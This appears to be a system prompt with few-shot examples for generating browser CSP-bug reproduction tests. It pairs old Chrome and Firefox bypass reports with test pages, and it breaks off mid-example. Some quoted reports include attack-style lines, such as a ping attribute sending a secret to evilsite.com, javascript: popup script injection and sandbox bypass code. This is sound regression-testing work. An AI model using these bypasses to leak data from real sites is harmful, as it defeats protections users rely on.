[
    {
        "role": "system",
        "content": [
            {
                "type": "text",
                "text": "{\"Role\": \"You are an expert web developer specializing in browser bug research and lifecycle analysis. Your task is to analyze bug reports with accompanying proof-of-concept (PoC) code and generate structured test cases to verify reproducibility.\", \"Context\": \"Context & File Structure:\\nEach test is an experiment for a bug_id organized as follows:\\nbug_id/\\n|-- url_queue.txt (optional)\\n|-- [domain1]/\\n|   |-- [page1]/\\n|   |   |-- index.html (or index.js)\\n|   |-- [page2]/\\n|       |-- index.html\\n|       |-- headers.json (optional)\\n|-- [domain2]/\\n    |-- ...\\n\\nAllowed domains:\\n* leak.test, a.test, sub.a.test, sub.sub.a.test, b.test, sub.b.test, adition.com\\nImportant: Use only these domains. No others allowed.\\n\\nPages:\\n* A domain can have multiple page folders (e.g., main, helper, worker).\\n* Each page must contain exactly one file: either index.html or index.js. No other filenames allowed.\\n\\nWeb Access:\\nFiles are accessed via:\\nhttps://[domain]/[page]\\nExample: a.test/main/index.html \\u2192 https://a.test/main\\n\\nHeaders (headers.json):\\nOptional. If present, must be a non-empty JSON array of key-value objects:\\n[\\n  {\\\"key\\\": \\\"Header-Name\\\", \\\"value\\\": \\\"Header-Value\\\"}\\n]\\n\\nNavigation (url_queue.txt):\\n* Required if navigation is not triggered by the browser itself.\\n* Contains one URL per line, in visit order.\\n* If absent, default flow:\\n    1. Load main page\\n    2. Navigate to: https://[domain]/report/?bughog_sanity_check=OK\", \"Goal\": \"You will be shown examples of bug reports and their test solutions.\\nStudy these examples and then generate a new test case for a previously unseen bug report, following the structure and rules above.\", \"Examples\": [{\"BugReport\": \"VULNERABILITY DETAILS\\nWe can bypass the header('Content-Security-Policy:sandbox') and access the DOM of sandboxed URLs.\\nWhat we are doing is very simple: inject code into the page *before* it has been loaded, so Chrome will honor that code even when it should discard it. In other words, Chrome should behave exactly as if the sandboxed URL were coming from a different domain, deleting injected code. Once it reads the header, boom, destroy injected code so it doesn't run.\\nVERSION\\nChrome Version: 35.0.1916.114 (Official Build 270117) m stable\\nOperating System: Windows 8.1 Pro Fully Updated\\nREPRODUCTION CASE\\nAttached is the PoC, but here's the explanation because it's quite simple:\\nWe open a new window which is header-sandboxed.\\nw = window.open(\\\"sandboxed.php\\\",\\\"\\\",\\\"width=400,height=400\\\");\\nBefore it loads, we inject an event and code:\\nw.onload = new w.Function(\\\"alert(document.body.innerText);document.body.innerHTML = '<h1>HACKED BY THE MAIN WINDOW</h1>'\\\");\\nThat's it! Chrome will not delete the event/function so it will run in the sandboxed window.\\nThanks!\", \"TestSolution\": {\"c377995\": {\"url_queue.txt\": \"https://a.test/CSP/c377995/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<html lang=\\\"en\\\">\\n  <head>\\n    <title>Bypass CSP Sandbox</title>\\n  </head>\\n  <body>\\n    <h1>Bypass CSP Sandbox</h1>\\n\\n    <input id=\\\"input\\\" type=\\\"button\\\" onclick=\\\"openCSP()\\\" value=\\\"Open CSP URL\\\" />\\n    <script>\\n      w = window.open(\\\"helper\\\", \\\"\\\", \\\"width=400,height=400\\\");\\n      w.onload = function () {\\n        document.location.href = \\\"https://a.test/report/?leak=c377995\\\";\\n      };\\n    </script>\\n  </body>\\n</html>\\n\"}, \"helper\": {\"index.html\": \"<!doctype html>\\n<html lang=\\\"en\\\">\\n <head>\\n  <title>Bypass CSP Sandbox</title>\\n </head>\\n <body>\\n  I've been sandboxed using the header:\\n  <br /><br />\\n\\t\\\"Content-Security-Policy\\\", \\\"sandbox allow-scripts\\\"\\n  <br /><br />\\n  Nobody, not even URLs from this same domain should be able to access me.\\n </body>\\n</html>\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"sandbox\\\"\\n}]\"}}}}}, {\"BugReport\": \"Sandboxed iframes run with a null principal for which Get/SetCsp is not implemented. This results in a scenario (iframe sandbox) wherein CSP is not enforced.\", \"TestSolution\": {\"f886164\": {\"a.test\": {\"main\": {\"index.html\": \"<iframe sandbox src=\\\"helper\\\"></iframe>\"}, \"helper\": {\"index.html\": \"<iframe src=\\\"https://a.test/report/?leak=f886164\\\"></iframe>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nChrome's CSP does not block favicon request properly.\\nDue to this, attacker can bypass CSP partially and get sensitive information via favicon request.\\nFYI, Spartan has same bug. Firefox is OK. But Firefox Mobile has same bug. I will report to both vendor later.\\nVERSION\\n42.0.2311.135 m\\nwindows 8.1\\nREPRODUCTION CASE\\nGo to http://vulnerabledoma.in/csp_favicon . This page has CSP header and only following contents:\\n<link rel=icon href=http://www.google.com/favicon.ico?0123456789>\\nSee console. You can see the following message:\\nRefused to load the image 'http://www.google.com/favicon.ico?9.17194871771247' because it violates the following Content Security Policy directive: \\\"default-src 'none'\\\". Note that 'img-src' was not explicitly set, so 'default-src' is used as a fallback.\\nBut in fact, Chrome sends favicon request. See the request using network tool.\\nFYI, Chrome Mobile(Android) has same issue. Also, the following request does not block by CSP:\\n<link rel=apple-touch-icon href=http://www.google.com/favicon.ico> <link rel=apple-touch-icon-precomposed href=http://www.google.com/favicon.ico>\", \"TestSolution\": {\"c482558\": {\"url_queue.txt\": \"https://leak.test/CSP/c482558/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<link rel=icon href=https://a.test/report/?leak=c482558>\\n\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"default-src 'none'\\\"\\n}]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:26.0) Gecko/20100101 Firefox/26.0 (Beta/Release)\\nBuild ID: 20131205075310\\n\\nSteps to reproduce:\\n\\nCSP does not block unpermitted resource in some case.\\nPoC is the following:\\n\\n[Case1] image URL in CSS\\nhttp://vulnerabledoma.in/fx_csp_bypass_with_cssimage\\n\\n[Case2] importScripts of Web Workers\\nhttp://vulnerabledoma.in/fx_csp_bypass_with_importScripts\\n\\n\\nActual results:\\n\\nCSP does not block unpermitted resource.\\n\\n\\nExpected results:\\n\\nCSP should block unpermitted resource.\", \"TestSolution\": {\"f949706\": {\"url_queue.txt\": \"https://leak.test/CSP/f949706/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"helper2\": {\"index.html\": \"\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Location\\\",\\n    \\\"value\\\": \\\"https://a.test/report/?leak=f949706\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"status\\\",\\n    \\\"value\\\": \\\"302\\\"\\n  }\\n]\\n\"}, \"main\": {\"index.html\": \"<link rel=\\\"stylesheet\\\" href=\\\"helper\\\">\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'\\\"\\n  }\\n]\"}, \"helper\": {\"index.css\": \"*{background:url('helper2')}\"}}}}}, {\"BugReport\": \"VULNERABILITY DETAILS\\nGiven a CSP header of script-src \\\\*.a.localhost, the script <script src=\\\"//a.localhost/script.js\\\"></script> should not be loaded. CSP spec section 4.2.2 step 4.6 states \\\"If the first character of the source expression\\u2019s host-part is an U+002A ASTERISK character (*) and the remaining characters, including the leading U+002E FULL STOP character (.), are not a case insensitive match for the rightmost characters of url-host, then return does not match\\\". Scripts such as <script src=\\\"//b.a.localhost/script.js\\\"></script> should be allowed by this policy.\\nVERSION\\nChrome Version: 45.0.2454.85\\nOperating System: Darwin c101.local 14.5.0 Darwin Kernel Version 14.5.0: Wed Jul 29 02:26:53 PDT 2015; root:xnu-2782.40.9~1/RELEASE_X86_64 x86_64 i386 MacBookPro11,3 Darwin\\nREPRODUCTION CASE\\nSee VULNERABILITY DETAILS section above.\", \"TestSolution\": {\"c534542\": {\"a.test\": {\"main\": {\"index.html\": \"<script src=\\\"//sub.a.test/CSP/c534542/helper\\\"></script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src *.sub.a.test\\\"\\n  }\\n]\\n\"}}, \"sub.a.test\": {\"helper\": {\"index.js\": \"document.location.href = \\\"https://a.test/report/?leak=c534542\\\";\\n\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:29.0) Gecko/20100101 Firefox/29.0 (Beta/Release)\\nBuild ID: 20140428193838\\n\\nSteps to reproduce:\\n\\nServe an HTML file with the header Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'.\\n\\nInside that file, use an inline script block to attempt to construct a Worker from a file:\\n\\n<script>\\n  var worker = new Worker(\\\"/worker.js\\\");\\n\\n  worker.onmessage = function(event) {\\n    alert(\\\"Received \\\" + event.data);\\n  }\\n\\n  worker.postMessage(\\\"ping\\\");\\n</script>\\n\\nWhere worker.js simply contains the following:\\n\\nthis.onmessage = function(event) {\\n  postMessage(\\\"pong\\\");\\n}\\n\\n\\nActual results:\\n\\n\\\"pong\\\" alert is shown. This means the Worker construction has been allowed from /worker.js, as the worker has replied to the message sent to it.\\n\\n\\nExpected results:\\n\\nConstruction of worker from /worker.js should be blocked by CSP.\\n\\nSee test pages at:\\n\\nhttp://csp.charlie.ht/worker-incorrectly-allowed.html\\nhttp://csp.charlie.ht/worker-correctly-allowed.html\\n\\nworker-incorrectly-allowed.html is served with the same HTML/header combination described in \\\"steps to reproduce\\\". The \\\"pong\\\" alert is shown, when I believe it shouldn't be. There is no directive stating that /worker.js is an allowed script source.\\n\\nworker-correctly-allowed.html has the same HTML, yet is served with script-src 'self' 'unsafe-inline'. In this case, I expect the Worker construction to be allowed, which is what happens.\\n\\nNote that this is similar to bug 929292 that I reported yesterday.\", \"TestSolution\": {\"f1007634\": {\"url_queue.txt\": \"https://a.test/CSP/f1007634/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"worker\": {\"index.js\": \"this.onmessage = function(event) {\\n    postMessage(\\\"pong\\\");\\n  }\"}, \"main\": {\"index.html\": \"<script>\\n  var worker = new Worker(\\\"worker\\\");\\n\\n  worker.onmessage = function (event) {\\n    document.location.href = \\\"https://a.test/report/?leak=f1007634\\\";\\n  };\\n\\n  worker.postMessage(\\\"ping\\\");\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"default-src 'none'; script-src 'unsafe-inline'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"The HTML5 Anchor Elements Ping attribute violates both set Content Security Policy and Chrome Extensions manifest permissions settings.\\nThe Ping url is allowed to connect regardless of Content Security Policy as in the example below:\\n\\n<!DOCTYPE html>\\n<head>\\n    <meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"default-src 'none';\\\">\\n</head>\\n<body>\\n<a href=\\\"#done\\\" ping=\\\"http://httpbin.org/post?secret=goes_here\\\">click here to exploit</a>\\n</body>\\n\\nSame goes when loaded as an Chrome Extension:\\n\\n# cat chrome-ext/manifest.json\\n{\\n  \\\"manifest_version\\\": 2,\\n\\n  \\\"name\\\": \\\"ping permission test\\\",\\n  \\\"description\\\": \\\"ping permission test\\\",\\n  \\\"version\\\": \\\"0.1\\\",\\n\\n  \\\"browser_action\\\": {\\n    \\\"default_icon\\\": \\\"icon.png\\\",\\n    \\\"default_popup\\\": \\\"popup.html\\\"\\n  },\\n  \\\"permissions\\\": [\\n  ]\\n}\\n\\n# cat chrome-ext/popup.html:\\n<!DOCTYPE html>\\n<body>\\n<a href=\\\"#done\\\" ping=\\\"http://evilsite.com/ping\\\">click here to exploit</a>\\n</body>\\n\\nAn attacker can use this as a data transportation method as part of an XSS attack on CSP restricted pages or similar.\\nTested on Google Chrome Version 46.0.2490.86 (64-bit) for MacOS 10.11.1 and Version 46.0.2490.86 m for Windows 7\", \"TestSolution\": {\"c560695\": {\"url_queue.txt\": \"https://leak.test/CSP/c560695/main\\nhttps://a.test/report/?leak=baseline\\n\", \"leak.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<head>\\n  <meta\\n    http-equiv=\\\"Content-Security-Policy\\\"\\n    content=\\\"default-src 'none'; script-src 'unsafe-inline';\\\"\\n  />\\n  <script>\\n    window.onload = function () {\\n      document.getElementById(\\\"a\\\").click();\\n    };\\n  </script>\\n</head>\\n<body>\\n  <a id=\\\"a\\\" href=\\\"#done\\\" ping=\\\"https://a.test/report/?leak=c560695\\\"\\n    >click here to exploit</a\\n  >\\n</body>\\n\"}}}}}, {\"BugReport\": \"This was reported to me out of band by Mario Heiderich (in CC):\\n\\nIf a HTTP response contains two CSP headers, the second one wins.\\nThe spec however, mandates that they are combined to a stricter intersection (see URL field).\\n\\nExample policies\\n1) content-security-policy: default-src 'self' 'unsafe-inline'\\n2) content-security-policy: default-src 'self'\\n\\nHere's what I observe:\\n* two CSP headers (1, then 2): 2 wins.\\n* two CSP headers (2, then 1): 1 wins. XSS possible.\\n\\nThis is especially interesting with header injections.\\n(The behavior is the same if the header injection attempts to resume the previous header. This is possible with injecting the newline and a space character and then overwriting a directive, i.e. injecting: \\\"\\\\n default-src 'self' 'unsafe-inline'\\\"\", \"TestSolution\": {\"f1036399\": {\"url_queue.txt\": \"https://a.test/CSP/f1036399/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<script>\\n  document.location.href = \\\"https://a.test/report/?leak=f1036399\\\";\\n</script>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self' 'unsafe-inline'\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36\\n\\nSteps to reproduce the problem:\\nPopups opened in the following way execute the contained script (which then have access to the DOM of the opener) even if the page was loaded with a CSP that forbids inline-scripts (works fine in FF):\\n\\n<!DOCTYPE html>\\n<html>\\n<head>\\n<script>\\n  par = 'val';\\n  url1 = \\\"javascript:'<scr\\\" + \\\"ipt>alert(`dom: `+document.domain+`\\\\\\\\\\\\nPdom:`+parent.document.domain+`\\\\\\\\\\\\npar: `+opener.par);</scr\\\" + \\\"ipt>'\\\";\\n  open(url1);\\n  url2 = \\\"javascript:alert(`dom: `+document.domain+`\\\\\\\\\\\\nPdom:`+parent.document.domain+`\\\\\\\\\\\\npar: `+opener.par);\\\";\\n  open(url2);\\n</script>\\n</head>\\n</html>\\n\\nWhat is the expected behavior?\\nScript execution in Popup is blocked due to CSP\\n\\nWhat went wrong?\\nCSP is inherited to popup opened with \\\"javascript:\\\"-URL\\n\\nDid this work before? No\\n\\nChrome version: 48.0.2564.97  Channel: stable\\nOS Version: 6.1 (Windows 7, Windows Server 2008 R2)\\nFlash Version: Shockwave Flash 20.0 r0\", \"TestSolution\": {\"c582387\": {\"url_queue.txt\": \"https://a.test/CSP/c582387/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<!DOCTYPE html>\\n<html>\\n    <head>\\n        <script src=\\\"helper\\\">\\n        </script>\\n    </head>\\n</html>\", \"headers.json\": \"[{\\n  \\\"key\\\": \\\"Content-Security-Policy\\\",\\n  \\\"value\\\": \\\"default-src 'self'; script-src 'self'\\\"\\n}]\"}, \"helper\": {\"index.js\": \"var par = \\\"val\\\";\\n//url1 = \\\"javascript:'<scr\\\" + \\\"ipt>eval(`document.location = \\\\\\\"https://a.test/report/?leak=c582387\\\\\\\"`);</scr\\\" + \\\"ipt>'\\\";\\n//url1 = \\\"javascript:'<scr\\\" + \\\"ipt>eval('document.location = \\\\'https://a.test/report/?leak=c582387\\\\'');</scr\\\" + \\\"ipt>'\\\";\\n//url1 = \\\"javascript:'<scr\\\" + \\\"ipt>eval('document.location = \\\\\\\"https://a.test/report/?leak=c582387\\\\\\\"\\\\\\\\');</scr\\\" + \\\"ipt>'\\\";\\n//url1 = 'javascript:\\\\x27<scr' + 'ipt>alert(\\\"dom:\\\\x20\\\"+document.domain+\\\"\\\\x5c\\\\x0aPdom:\\\"+parent.document.domain+\\\"\\\\x5c\\\\x0apar:\\\\x20\\\"+opener.par);</scr' + 'ipt>\\\\x27';\\n//url1 = \\\"javascript:'<scr\\\" + \\\"ipt>`document.location=\\\\\\\"https://a.test/report/?leak=c582387\\\\\\\"`;</scr\\\" + \\\"ipt>'\\\";\\nvar url1 =\\n  \\\"javascript:'<scr\\\" +\\n  'ipt>document.location=\\\"https://a.test/report/?leak=c582387\\\"</scr' +\\n  \\\"ipt>'\\\";\\nopen(url1);\\n\"}}}}}, {\"BugReport\": \"Both Chromium and Firefox decided to do case-sensitive matching for path-part of source-expression, despite both CSP v2 and v3 are telling to do case-insensitive match (I reported it in https://bugs.chromium.org/p/chromium/issues/detail?id=590502).\\nGiven a header of Content-Security-Policy: script-src localhost/a/B/c/d/, the script <script src=\\\"//localhost/a/b/c/d/script.js\\\"></script> should not be loaded, as specification doesn't provide special handling for non-first entry in source-expression-path-list.\\nVULNERABILITY DETAILS\\nExample code that does not load the script in FF and loads in Chromium:\\npackage main  \\n  \\nimport (  \\n    \\\"fmt\\\"  \\n    \\\"net/http\\\"  \\n)  \\nfunc main() {  \\n    http.HandleFunc(\\\"/script/a/b/c/d/script.js\\\", func(w http.ResponseWriter, r \\\\*http.Request) {  \\n    fmt.Fprintln(w, `  \\n    alert(1);  \\n  `)  \\n    })  \\n  \\n    http.HandleFunc(\\\"/\\\", func(w http.ResponseWriter, r \\\\*http.Request) {  \\n        w.Header().Set(\\\"Content-Security-Policy\\\", \\\"script-src localhost:8888/script/a/b/C/D/\\\")  \\n    fmt.Fprintln(w, `<html>  \\n    <body>  \\n      <script src='/script/a/b/c/d/script.js'></script>  \\n    </body>  \\n  </html>`)  \\n    })  \\n    http.ListenAndServe(\\\":8888\\\", nil)  \\n}  \\n  \\nVERSION\\nChrome Version: 50.0.2652.0 dev (64-bit)\\nOperating System: Darwin 15.3.0 Darwin Kernel Version 15.3.0; root:xnu-3248.30.4~1/RELEASE_X86_64 x86_64\\nREPRODUCTION CASE\\nPlease include a demonstration of the security bug, such as an attached\\nHTML or binary file that reproduces the bug when loaded in Chrome. PLEASE\\nmake the file as small as possible and remove any content not required to\\ndemonstrate the bug.\\nFOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION\\nType of crash: [tab, browser, etc.]\\nCrash State: [see link above: stack trace, registers, exception record]\\nClient ID (if relevant): [see link above]\", \"TestSolution\": {\"c590505\": {\"a.test\": {\"main\": {\"index.html\": \"<html>\\n  <body>\\n    <script src=\\\"https://a.test/report/?leak=c590505\\\"></script>\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"script-src a.test/rEpOrT/\\\"\\n  }\\n]\\n\"}}}}}, {\"BugReport\": \"There is a discrepancy in our CSP implementation and the spec. The spec says [1] that blob:, data:, and filesystem: should be excluded in case of a wildcard (allow all) when matching source expressions.\\n\\nCurrently we allow all schemes in case of an asterisk wildcard, e.g. here: [2].\\n\\nWe should update our implementation to follow the spec.\\n\\n[1] http://www.w3.org/TR/CSP11/#match-source-expression\\n[2] http://mxr.mozilla.org/mozilla-central/source/content/base/src/nsCSPUtils.cpp#291\", \"TestSolution\": {\"f1086999\": {\"url_queue.txt\": \"https://a.test/CSP/f1086999/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"<iframe\\n  src='data:text/html,<img id=\\\"123\\\"><script>document.getElementById(\\\"123\\\").src = \\\"https://a.test/report/?leak=f1086999\\\";</script>'\\n></iframe>\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src * 'unsafe-inline'\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1.\\nwrite a html page like this\\n<?php\\nheader(\\\"Content-Security-Policy: referrer origin-when-crossorigin\\\");\\n?>\\n<html>\\n<head>\\n<link href=\\\"http://www.style.com\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\\n</head>\\n<img src=\\\"https://www.img1.com/\\\">\\n<img src=\\\"http://www.img2.com/x.png\\\">\\n<img src=\\\"http://www.img3.com\\\" rel=\\u201dnoreferrer\\u201d>\\n<iframe src=\\\"http://www.iframe.com/\\\"></iframe>\\n<script src=\\\"http://www.script.com/\\\"></script>\\n<script>\\nvar xmlhttp;\\nxmlhttp = new XMLHttpRequest();\\nxmlhttp.open('http://www.ajaxtesttest.com').send();\\n</script>\\n</html>\\n\\n2.\\nset the csp header:\\nContent-Security-Policy: referrer origin-when-crossorigin\\nor\\nContent-Security-Policy: referrer origin-when-cross-origin\\n\\n3.\\nview this html page in chrome, and you will see that we can bypass the csp policy by using img/script/link tags\\n\\nWhat is the expected behavior?\\nthe resource requested from the webpage with csp header set  should not send the entire referer\\n\\nWhat went wrong?\\nA tag href/JS ajax/iframe-src/Object-data/embed-src will follow the referrer policy in CSP header.\\nbut, style-link-href/img-src/script-src can bypass the csp referer policy header.\\n\\nbtw,\\nwe find that the csp policy in meta tag works fine ,like this:\\n<meta http-equiv=\\\"Content-Security-Policy\\\" content=\\\"referrer origin-when-cross-origin\\\">\\nwe think  csp header should be the same with meta tag\\n\\nDid this work before? N/A\\n\\nChrome version: 50.0.2661.75  Channel: beta\\nOS Version: OS X 10.11.2\\nFlash Version: Shockwave Flash 21.0 r0\", \"TestSolution\": {\"c605451\": {\"leak.test\": {\"main\": {\"index.html\": \"<!--<html>\\n    <head>\\n        <link href=\\\"http://www.style.com\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\\n    </head>\\n    <body>\\n        <img src=\\\"https://a.test/report/if/Referrer\\\">\\n        <img src=\\\"http://www.img2.com/x.png\\\">\\n        <img src=\\\"http://www.img3.com\\\" rel=\\u201dnoreferrer\\u201d>\\n        <iframe src=\\\"http://www.iframe.com/\\\"></iframe>\\n        <script src=\\\"http://www.script.com/\\\"></script>\\n        <script>\\n            var xmlhttp;\\n            xmlhttp = new XMLHttpRequest();\\n            xmlhttp.open('http://www.ajaxtesttest.com').send();\\n        </script>\\n    </body>\\n</html>-->\\n\\n<html>\\n  <head>\\n    <link\\n      href=\\\"https://a.test/report/if/Referer/contains/c605451?leak=c605451\\\"\\n      rel=\\\"stylesheet\\\"\\n      type=\\\"text/css\\\"\\n    />\\n  </head>\\n  <body>\\n    <img src=\\\"https://a.test/report/if/Referer/contains/c605451?leak=c605451\\\" />\\n  </body>\\n</html>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"referrer origin-when-crossorigin\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"DETAILS\\nMissing spec on Upgrade Insecure Requests(Navigational Upgrades)\\nStep to reproduce:\\nGo to page which is enabled \\\"Content-Security-Policy: upgrade-insecure-requests\\\"\\nWhen a user clicks a http link, chrome will not treat a http link as \\\"https\\\" link.\\nExpected result:\\nWhen a user clicks a http link, chrome will change a http url to https url.\\nW3C specification has an example....\\nNavigational Upgrades\\nMegacorp, Inc. isn't quite ready to deliver Strict Transport Security headers [RFC6797], but does want to keep users on secure pages when possible. Happily, this comes for free with upgrade-insecure-requests. That is, they're already delivering pages with the following header:\\nContent-Security-Policy: upgrade-insecure-requests\\nThis allows user agents to treat the following HTML code:\\n<a href=\\\"http://example.com/\\\">Home</a>\\nas though it had been delivered as:\\n<a href=\\\"https://example.com/\\\">Home</a>\\nSource: http://www.w3.org/TR/upgrade-insecure-requests/#example-navigation\\nAuthors should be able to ensure that all internal links correctly send users to the site's secure address, and not to its pre-migration insecure address.\\nSource:http://www.w3.org/TR/upgrade-insecure-requests/#goals\\nVERSION\\nChrome Version: [50.0.2661.94] + [stable]\\nOperating System: [Ubuntu 14.04 LTS 64 bit]\\nI uploaded my poc video to google drive. Please watch it.\\nhttps://drive.google.com/open?id=0B5EL3NI3hlsSNlN6V0pyVTRoZ1U\", \"TestSolution\": {\"c610441\": {\"a.test\": {\"main\": {\"index.html\": \"<a id=\\\"123\\\" href=\\\"http://a.test/report/if/using/http?leak=c610441\\\"></a>\\n<script>\\n  document.getElementById(\\\"123\\\").click();\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"upgrade-insecure-requests\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"User Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36\\n\\nSteps to reproduce:\\n\\nOpen the following PoC.\\nhttp://mallory.csrf.jp/x-mixed-replace/csp/bad.php\\n\\n\\n\\nActual results:\\n\\nThe response from above URL is multipart/x-mixed-replace and it contains two text/html documents in it. Both documents triggers alert(1); and alert(2) from the inline-script. This URL is protected by CSP with default-src 'self' so the inline-script should be ignored but Firefox doesn't.\\n\\n\\nExpected results:\\n\\nCSP should be applied to all documents in a multipart/x-mixed-replace response.\\nThe inline script script execution should be ignored like ordinal HTML document (see following URL).\\nhttp://mallory.csrf.jp/x-mixed-replace/csp/good.php\", \"TestSolution\": {\"f1223743\": {\"url_queue.txt\": \"https://a.test/CSP/f1223743/main\\nhttps://a.test/report/?leak=baseline\\n\", \"a.test\": {\"main\": {\"index.html\": \"--boundary Content-type: text/html Page 1:\\n<script>\\n  document.location.href = \\\"https://a.test/report/?leak=f1223743\\\";\\n</script>\\n--boundary Content-type: text/html Page 2:\\n<script>\\n  document.location.href = \\\"https://a.test/report/?leak=f1223743\\\";\\n</script>\\n--boundary\\n\", \"headers.json\": \"[\\n  {\\n    \\\"key\\\": \\\"Content-Security-Policy\\\",\\n    \\\"value\\\": \\\"default-src 'self'\\\"\\n  },\\n  {\\n    \\\"key\\\": \\\"Content-Type\\\",\\n    \\\"value\\\": \\\"multipart/x-mixed-replace;boundary=boundary\\\"\\n  }\\n]\"}}}}}, {\"BugReport\": \"UserAgent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.82 Safari/537.36\\n\\nSteps to reproduce the problem:\\n1. Issue a CSP that includes form-action 'self'\\n2. Add a form to a page that POSTs elsewhere with target=\\\"_blank\\\"\\n3. Submit the form\\n\\nWhat is the expected behavior?\\nThe form should be blocked.\\n\\nWhat went wrong?\\nI would have expected the form to be blocked but it is not.\\n\\nDid this work before? N/A\\n\\nChrome version: 52.0.2743.82  Channel: stable\\nOS Version: 10.0\\nFlash Version: Shockwave Flash 22.0 r0\\n\\nThere is a test page here: https://scotthelme.co.uk/form-action-test-bug/\\n\\nFirefox blocks both forms, Chrome only blocks the one without a target attribute.\", \"TestSolution\": {\"c630332\": {\"a.test\": {\"main\": {\"index.html\": \"<form\\n  id=\\\"form\\\"\\n  action=\\\"https://a.test/report/?leak=c630332\\\"\\n  method=\\\"post\\\"\\n  role=\\\"form\\\"\\n  target=\\\"_blank\\\"\\n></form>\\n<script>\\n  document.getElementById(\\\"form\\\").submit();\\n</script>\\n\", \"headers.json\": \"[\\n    {\\n        \\\"key\\\": \\\"Content-Security-Policy\\\",\\n        \\\"value\\\": \\\"form-action 'none'\\\"\\n    }\\n]\"}}}}}, {\"BugReport\": \"Repro steps:\\n\\n1. evil.com declares a frame-src CSP (via report-only CSP directive)\\n2. evil.com listens to \\\"securitypolicyviolation\\\" events\\n3. evil.com frames innocent.com and tickles a navigation within the innocent.com frame\\n\\n\\nExpected behavior:\\n\\nevil.com should not be able to see information about child's sources.\\n\\n\\nActual behavior:\\n\\nSecurityPolicyViolationEvent includes sourceFile, lineNumber, columnNumber (https://www.w3.org/TR/CSP2/#securitypolicyviolationevent-interface).\\nThis information is disclosed to the parent frame via SecurityPolicyViolationEvent\\n(in addition to being sent to the reporting endpoint provided in report-uri directive).\\n\\n\\n\\nIn particular, if I add\\n\\n        testRunner.waitUntilDone();\\n\\n        document.addEventListener(\\\"securitypolicyviolation\\\", function(e) {\\n            // ...\\n            console.log(\\\"securitypolicyviolation_event.sourceFile=\\\" + e.sourceFile);\\n            console.log(\\\"securitypolicyviolation_event.lineNumber=\\\" + e.lineNumber);\\n            console.log(\\\"securitypolicyviolation_event.columnNumber=\\\" + e.columnNumber);\\n            testRunner.notifyDone();\\n        });\\n\\nto http/tests/security/contentSecurityPolicy/frame-src-child-frame-navigates-to-blocked-origin.html, then I see that we will disclose the following information:\\n\\nsourceFile=https://localhost:8443/security/contentSecurityPolicy/resources/frame-that-navigates-itself.html\\nlineNumber=7\\ncolumnNumber=18\\n\\nto a cross-origin frame at http://127.0.0.1:8000/security/contentSecurityPolicy/frame-src-child-frame-navigates-to-blocked-origin.html.\", \"TestSolution\": {\"c633348\": {\"a.test\": {\"main\": {\"index.html\": \"<iframe 